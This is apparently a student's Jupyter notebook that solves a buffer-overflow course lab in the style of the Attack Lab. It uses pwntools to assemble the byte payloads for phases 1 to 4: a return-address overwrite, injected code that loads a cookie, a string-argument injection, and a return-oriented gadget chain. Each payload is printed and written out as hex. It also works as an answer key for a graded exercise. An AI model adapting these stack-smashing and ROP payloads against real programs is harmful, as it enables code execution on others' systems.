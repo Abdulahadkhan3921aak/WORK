{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [],
   "source": [
    "touch1_addr = p64(0x401778)\n",
    "touch2_addr = p64(0x4017A4)\n",
    "touch3_addr = p64(0x401879)\n",
    "gadget1_addr = p64(0x401937)\n",
    "cookie = p64(0x65D471B5)\n",
    "cookie_string = p64(0x3562313734643536)\n",
    "gadget2_addr = p64(0x401909)\n",
    "bufferOffset = p64(0x000000000000000000000000000000000000000000000000)\n",
    "move_cookie = p64(0xC3B571D465C7C748)\n",
    "rsp_addr = p64(0x556685C8)\n",
    "rsp_addr_56 = p64(0xC355668600C7C748)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Phase 1 Task Code `COMPLETE`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000x\u0017@\u0000\u0000\u0000\u0000\u0000\n",
      "000000000000000000000000000000000000000000000000000000000000000000000000000000007817400000000000\n",
      "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 17 40 00 00 00 00 00\n",
      "00 00 00 00 00 00 00 00 \n",
      "00 00 00 00 00 00 00 00 \n",
      "00 00 00 00 00 00 00 00 \n",
      "00 00 00 00 00 00 00 00 \n",
      "00 00 00 00 00 00 00 00 \n",
      "78 17 40 00 00 00 00 00 \n"
     ]
    }
   ],
   "source": [
    "phase1 = (\n",
    "    bufferOffset\n",
    "    + bufferOffset\n",
    "    + bufferOffset\n",
    "    + bufferOffset\n",
    "    + bufferOffset\n",
    "    + touch1_addr\n",
    ")\n",
    "print(phase1.decode(\"latin-1\"))\n",
    "# print the value of the payload to be used in the exploit in hex format with 2 bytes per character and space inbetween each pair\n",
    "print(phase1.hex())\n",
    "formatted_payload = \" \".join([f\"{byte:02x}\" for byte in phase1])\n",
    "print(formatted_payload)\n",
    "n = 1\n",
    "for byte in phase1:\n",
    "    print(f\"{byte:02x}\", end=\" \")\n",
    "    if n % 8 == 0:\n",
    "        print(\"\\n\", end=\"\")\n",
    "    n += 1\n",
    "with open(\"phase1.txt\", \"w\") as file:\n",
    "    n = 1\n",
    "    for byte in phase1:\n",
    "        file.write(f\"{byte:02x}\")\n",
    "        if n % 8 == 0:\n",
    "            file.write(\"\\n\")\n",
    "        else:\n",
    "            file.write(\" \")\n",
    "        n += 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Phase 2 Task Code ``"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HÇÇeÔqµÃ\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000ÈfU\u0000\u0000\u0000\u0000¤\u0017@\u0000\u0000\u0000\u0000\u0000\n",
      "48c7c765d471b5c30000000000000000000000000000000000000000000000000000000000000000c885665500000000a417400000000000\n",
      "48 c7 c7 65 d4 71 b5 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c8 85 66 55 00 00 00 00 a4 17 40 00 00 00 00 00\n",
      "48 c7 c7 65 d4 71 b5 c3 \n",
      "00 00 00 00 00 00 00 00 \n",
      "00 00 00 00 00 00 00 00 \n",
      "00 00 00 00 00 00 00 00 \n",
      "00 00 00 00 00 00 00 00 \n",
      "c8 85 66 55 00 00 00 00 \n",
      "a4 17 40 00 00 00 00 00 \n"
     ]
    }
   ],
   "source": [
    "phase2 = (\n",
    "    move_cookie\n",
    "    + bufferOffset\n",
    "    + bufferOffset\n",
    "    + bufferOffset\n",
    "    + bufferOffset\n",
    "    + rsp_addr\n",
    "    + touch2_addr\n",
    ")\n",
    "print(phase2.decode(\"latin-1\"))\n",
    "# print the value of the payload to be used in the exploit in hex format with 2 bytes per character and space inbetween each pair\n",
    "print(phase2.hex())\n",
    "formatted_payload = \" \".join([f\"{byte:02x}\" for byte in phase2])\n",
    "print(formatted_payload)\n",
    "n = 1\n",
    "for byte in phase2:\n",
    "    print(f\"{byte:02x}\", end=\" \")\n",
    "    if n % 8 == 0:\n",
    "        print(\"\\n\", end=\"\")\n",
    "    n += 1\n",
    "with open(\"phase2.txt\", \"w\") as file:\n",
    "    n = 1\n",
    "    for byte in phase2:\n",
    "        file.write(f\"{byte:02x}\")\n",
    "        if n % 8 == 0:\n",
    "            file.write(\"\\n\")\n",
    "        else:\n",
    "            file.write(\" \")\n",
    "        n += 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Phase 3 Task Code ``"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HÇÇ\u0000fUÃ\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000ÈfU\u0000\u0000\u0000\u0000y\u0018@\u0000\u0000\u0000\u0000\u000065d471b5\n",
      "48c7c700866655c30000000000000000000000000000000000000000000000000000000000000000c88566550000000079184000000000003635643437316235\n",
      "48 c7 c7 00 86 66 55 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c8 85 66 55 00 00 00 00 79 18 40 00 00 00 00 00 36 35 64 34 37 31 62 35\n",
      "48 c7 c7 00 86 66 55 c3 \n",
      "00 00 00 00 00 00 00 00 \n",
      "00 00 00 00 00 00 00 00 \n",
      "00 00 00 00 00 00 00 00 \n",
      "00 00 00 00 00 00 00 00 \n",
      "c8 85 66 55 00 00 00 00 \n",
      "79 18 40 00 00 00 00 00 \n",
      "36 35 64 34 37 31 62 35 \n"
     ]
    }
   ],
   "source": [
    "phase3 = (\n",
    "    rsp_addr_56\n",
    "    + bufferOffset\n",
    "    + bufferOffset\n",
    "    + bufferOffset\n",
    "    + bufferOffset\n",
    "    + rsp_addr\n",
    "    + touch3_addr\n",
    "    + cookie_string\n",
    ")\n",
    "print(phase3.decode(\"latin-1\"))\n",
    "# print the value of the payload to be used in the exploit in hex format with 2 bytes per character and space inbetween each pair\n",
    "print(phase3.hex())\n",
    "formatted_payload = \" \".join([f\"{byte:02x}\" for byte in phase3])\n",
    "print(formatted_payload)\n",
    "n = 1\n",
    "for byte in phase3:\n",
    "    print(f\"{byte:02x}\", end=\" \")\n",
    "    if n % 8 == 0:\n",
    "        print(\"\\n\", end=\"\")\n",
    "    n += 1\n",
    "with open(\"phase3.txt\", \"w\") as file:\n",
    "    n = 1\n",
    "    for byte in phase3:\n",
    "        file.write(f\"{byte:02x}\")\n",
    "        if n % 8 == 0:\n",
    "            file.write(\"\\n\")\n",
    "        else:\n",
    "            file.write(\" \")\n",
    "        n += 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# PHASE 4 Task Code#`Complete`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 103,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "payload = bufferOffset + bufferOffset + bufferOffset + bufferOffset + bufferOffset + gadget1_addr + cookie + gadget2_addr + touch2_addr\n",
    "print(payload.decode(\"latin-1\"))\n",
    "# print the value of the payload to be used in the exploit in hex format with 2 bytes per character and space inbetween each pair\n",
    "print(payload.hex())\n",
    "formatted_payload = ' '.join([f\"{byte:02x}\" for byte in payload])\n",
    "print(formatted_payload)\n",
    "n = 1\n",
    "for byte in payload:\n",
    "    print(f\"{byte:02x}\",end=\" \")\n",
    "    if n % 8 == 0:\n",
    "        print(\"\\n\",end=\"\")\n",
    "    n+=1\n",
    "with open(\"phase4.txt\", \"w\") as file:\n",
    "    n = 1\n",
    "    for byte in payload:\n",
    "        file.write(f\"{byte:02x}\")\n",
    "        if n % 8 == 0:\n",
    "            file.write(\"\\n\")\n",
    "        else:\n",
    "            file.write(\" \")\n",
    "        n+=1"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
